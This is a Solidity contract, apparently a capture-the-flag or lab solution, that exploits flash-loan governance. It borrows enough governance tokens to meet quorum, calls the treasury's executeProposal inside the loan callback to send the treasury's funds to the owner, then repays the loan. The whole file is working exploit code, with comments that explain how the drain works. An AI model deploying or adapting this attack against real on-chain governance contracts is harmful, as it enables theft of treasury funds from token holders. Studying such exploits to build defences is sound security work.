// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IFlashQuorumToken {
    function flashLoan(uint256 amount) external;
    function flashFee(uint256 amount) external pure returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IFlashQuorum {
    function executeProposal(address payable beneficiary) external;
}

contract FlashQuorumAttack {
    address public owner;
    IFlashQuorumToken public immutable govToken;
    IFlashQuorum public immutable treasury;

    constructor(address _govToken, address _treasury) {
        owner = msg.sender;
        govToken = IFlashQuorumToken(_govToken);
        treasury = IFlashQuorum(_treasury);
    }

    /// @notice Pulls the flash loan fee from the owner's own balance first
    /// (they must approve() this contract beforehand), since the fee is
    /// real cost that has to come from pre-existing funds, unlike the
    /// principal, which is minted and burned from nothing.
    function attack(uint256 quorum) external {
        require(msg.sender == owner, "Not owner");
        uint256 fee = govToken.flashFee(quorum);
        govToken.transferFrom(owner, address(this), fee);
        govToken.flashLoan(quorum);
    }

    /// @notice Called back by the token mid-flashLoan, while this contract
    /// momentarily holds `amount` votes. That's enough to clear quorum and
    /// drain the treasury before the borrowed tokens are burned back and
    /// the fee is transferred out of this contract's balance.
    function onFlashLoan(uint256) external {
        treasury.executeProposal(payable(owner));
    }
}
